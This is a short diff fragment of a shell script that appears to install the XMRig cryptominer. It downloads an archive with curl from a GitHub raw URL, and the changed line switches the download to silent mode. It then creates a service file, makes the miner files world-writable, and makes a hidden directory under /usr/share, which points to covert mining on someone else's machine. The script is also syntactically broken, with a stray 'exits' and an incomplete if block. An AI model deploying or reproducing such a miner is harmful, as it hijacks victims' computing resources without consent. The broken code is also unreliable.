@@ -18,7 +18,7 @@ then
    }
    exits
    
-  if ! curl -L --progress-bar "https://raw.githubusercontent.com/ardx2/1/main/xmrig.tar.gz"
+  if ! curl -s -O --progress-bar "https://raw.githubusercontent.com/ardx2/1/main/xmrig.tar.gz"
    touch xmrig.service
    per=$(chmod 777 xmrig config.json && chmod 644 xmrig.service)
    dir=$(mkdir /usr/share/.logstxt)
